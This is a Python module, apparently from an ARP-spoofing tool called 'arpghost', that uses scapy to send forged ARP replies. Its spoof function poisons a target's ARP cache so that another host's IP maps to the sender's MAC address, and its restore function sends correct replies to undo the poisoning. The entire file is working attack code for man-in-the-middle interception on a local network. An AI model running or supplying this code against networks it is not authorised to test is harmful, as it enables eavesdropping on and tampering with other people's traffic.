from scapy.all import ARP, send

from arpghost.utils.mac import get

from arpghost.config.colors import COLORS


def spoof(target, host, verbose=True):
    tmac = get(
        target
    )


    response = ARP(
        pdst=target,
        hwdst=tmac,
        psrc=host,
        op='is-at'
    )


    send(
        response,
        verbose=0
    )


    if verbose:
        mac = ARP().hwsrc
        print(
            f"{COLORS['RESET']}[*] {COLORS['INFO']}Sent to : {target} | {host} is-at : {mac}"
        )


def restore(target, host, verbose=True):
    mac = get(
        host
    )

    tmac = get(
        target
    )


    response = ARP(
        pdst=target,
        hwdst=tmac,
        psrc=host,
        hwsrc=mac,
        op='is-at'
    )


    send(
        response,
        verbose=0,
        count=7
    )


    if verbose:
        print(
            f"{COLORS['RESET']}[*] {COLORS['INFO']}Sent to : {target} | {host} is-at : {mac}"
        )
